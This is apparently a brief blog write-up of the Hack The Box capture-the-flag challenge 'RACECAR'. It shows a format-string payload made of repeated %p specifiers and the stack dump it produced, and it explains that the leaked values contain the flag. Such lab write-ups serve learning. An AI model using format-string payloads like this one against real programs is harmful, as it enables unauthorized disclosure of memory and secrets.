---
layout: post
title: Hack the Box rev HTB_RACECAR 
image: /assets/img/HTB-Logo.png
date:   2022-12-12 11:15:01
tags:
- rev
description: Basic rev challenge
categories:
- Hack The Box
---

HTB_RACECAR
Format string exploit challenge


```
 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p                      
```          

```
The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
0x585581c00x1700x56585d850x90x350x260x10x20x5658696c0x585581c00x585583400x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f 0x8fc59e000xf7f7b3fc0x56588f8c0xffd3dbd80x565864410x10xffd3dc840xffd3dc8c0x8fc59e000xffd3dbf0(nil)(nil)0xf7dbef210xf7f7b0000xf7f7b000(nil)0xf7dbef210x10xffd3dc840xffd3dc8c0xffd3dc140x1 
```
![](/assets/img/2022-09-15-22-14-41.png)
The printf allows us to input whatever format string we want so we can dumb content off the stack. The flag is on the stack and we leak it.

![](/assets/img/2022-09-15-22-13-47.png)
The last dot is garbage left on the stack